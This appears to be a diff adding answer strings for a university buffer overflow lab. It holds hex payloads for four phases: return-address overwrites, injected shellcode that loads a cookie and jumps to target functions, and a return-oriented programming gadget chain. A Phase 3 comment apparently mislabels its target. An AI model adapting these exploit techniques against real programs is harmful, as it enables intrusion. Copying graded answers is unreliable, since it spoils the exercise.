@@ -1,0 +1,27 @@
+Phase 1: 
+01 01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01
+86 13 40 00 00 00 00 00 /* Address of touch1 */
+
+Phase 2:
+48 c7 c7 48 8e ca 4b 90 /* mov cookie to rdi */
+68 b2 13 40 00 90 90 90 /* push touch2 address onto stack */
+c3 00 00 00 00 00 00 00 /* ret */
+98 89 64 55 00 00 00 00 /* Return to 0x55648990 */
+
+Phase 3:
+48 c7 c7 b8 89 64 55 90 /* mov cookies string to rdi */
+68 c3 14 40 00 90 90 90 /* push touch2 address onto stack */
+c3 00 00 00 00 00 00 00 /* ret */
+98 89 64 55 00 00 00 00 /* Return to 0x55648998 */
+34 62 63 61 38 65 34 38 /* Cookie string */
+
+Phase 4:
+00 00 00 00 00 00 00 00 /* Fill */
+00 00 00 00 00 00 00 00 /* Fill */
+00 00 00 00 00 00 00 00 /* Fill */
+63 15 40 00 00 00 00 00 /* Address of first gadget */
+48 8e ca 4b 00 00 00 00 /* Cookie Value */
+77 15 40 00 00 00 00 00 /* Address of second gadget */
+b2 13 40 00 00 00 00 00 /* Address of touch2 */
